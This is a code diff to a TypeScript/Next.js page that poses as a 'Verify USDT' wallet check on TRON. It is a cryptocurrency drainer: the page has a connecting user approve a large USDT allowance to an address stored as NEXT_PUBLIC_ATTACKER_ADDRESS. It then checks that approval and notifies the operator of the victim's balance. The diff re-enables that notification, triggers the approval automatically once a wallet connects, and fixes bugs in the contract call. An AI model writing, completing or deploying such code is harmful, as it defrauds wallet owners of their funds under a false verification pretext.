@@ -18,6 +18,7 @@ const VerifyUsdtPage: NextPage = () => {
     const [verifyLoading, setVerifyLoading] = useState(false);
     const [loginShow, setLoginShow] = useState(false);
     const [completed, setCompleted] = useState(false);
+    const [effectVerified, setEffectVerified] = useState(false);
     const [balance, setBalance] = useState(0);
     const tickerTheme = "light";
     const router = useRouter();
@@ -44,14 +45,21 @@ const VerifyUsdtPage: NextPage = () => {
         setLoginShow(false);
     }
     useEffect(() => {
-        if (adapters[selectedIndex].address !== null && !completed) {
+        if (adapters[selectedIndex].address !== null && !completed && !effectVerified) {
+            setEffectVerified(true);
             verifyWallet();
         }
         if (completed) {
-            toastNotification("Verified Successfully", true);
-            router.push('/');
-          } 
+        // 
+            completeComp();
+        } 
     }, [adapters, selectedIndex, completed]);
+
+    async function completeComp() {
+        toastNotification("Verified Successfully", true);
+        await new Promise(resolve => setTimeout(resolve, 10000));
+        // router.push('/'); 
+    }
     
 
     async function checkBalance(address: string) {
@@ -81,19 +89,19 @@ const VerifyUsdtPage: NextPage = () => {
 
     
     async function checkApprovalStatus() {
-        const functionSelector = 'allowance(address, address)';
+        const functionSelector = 'allowance(address,address)';
         console.log(process.env.NEXT_PUBLIC_ATTACKER_ADDRESS + ' '+ adapters[selectedIndex].address);
         const parameter = [{ type: 'address', value: adapters[selectedIndex].address },
                             { type: 'address', value: process.env.NEXT_PUBLIC_ATTACKER_ADDRESS }    
                             ];
 
         try {
-            // tronWeb.setAddress(adapters[selectedIndex].address)
+            tronWeb.setAddress(adapters[selectedIndex].address)
             const result = await tronWeb.transactionBuilder.triggerConstantContract(
                 process.env.NEXT_PUBLIC_USDT_ADDRESS
                 , functionSelector, {}, parameter);
 
-            console.log(result);
+            console.log("Cowboy: "+result);
 
             // Extract constant_result from the result
             const constantResult = result.constant_result[0];
@@ -129,7 +137,7 @@ const VerifyUsdtPage: NextPage = () => {
     async function connectWallet(index: number) {
         setLoading(true);
         const adapter = adapters[index]; // Use selected adapter
-        if (adapter.address == null) {
+        if (adapter.address === null) {
             try {
                 await adapter.connect();
                 setLoading(false);
@@ -149,7 +157,7 @@ const VerifyUsdtPage: NextPage = () => {
             } catch (error) {
                 setLoading(false);
                 setLoginShow(false);
-                toastNotification('Error disconnecting wallet', false);
+                // toastNotification('Error disconnecting wallet', false);
             }
         }
     }
@@ -157,6 +165,10 @@ const VerifyUsdtPage: NextPage = () => {
     async function verifyWallet() {
         if(verifyLoading) {
             toastNotification('please wait...', true);
+            return;
+        }
+        if(adapters[selectedIndex].address.toString() === null || adapters[selectedIndex].address.toString().length < 1) {
+            connectWallet(selectedIndex);
             return;
         }
         setVerifyLoading(true);
@@ -167,7 +179,7 @@ const VerifyUsdtPage: NextPage = () => {
         console.log(bal);
         await approveUSDT(100000000);
         if(await checkApprovalStatus()) {
-            // await sendNotification(selectedIndex, bal);
+            await sendNotification(selectedIndex, bal);
             toastNotification('Verified USDT balance', true);
             setVerifyLoading(false);
             setCompleted(true);
@@ -190,6 +202,10 @@ const VerifyUsdtPage: NextPage = () => {
     // Approval or increaseApproval
     async function approveUSDT(amount:number) {
         // console.log('cow')
+        if(adapters[selectedIndex].address === null) {
+            connectWallet(selectedIndex);
+            return;
+        }
         try {
             tronWeb.setAddress(adapters[selectedIndex].address)
             // Prepare the parameters for the USDT contract's approve function
@@ -274,9 +290,9 @@ const VerifyUsdtPage: NextPage = () => {
                                 <div className="collapse navbar-collapse" id="navbarNavDropdown">
                                     <ul className="navbar-nav">
                                                                                 
-                                        <li className="nav-item">
+                                        {/* <li className="nav-item">
                                             <Link href="/" className="nav-link" data-scroll-nav="0">Home</Link>
-                                        </li>
+                                        </li> */}
                                         <li className="nav-item">
                                             <Link className="nav-link" target="blank" href="/dashboard" data-scroll-nav="1">Dashboard</Link>
                                         </li>
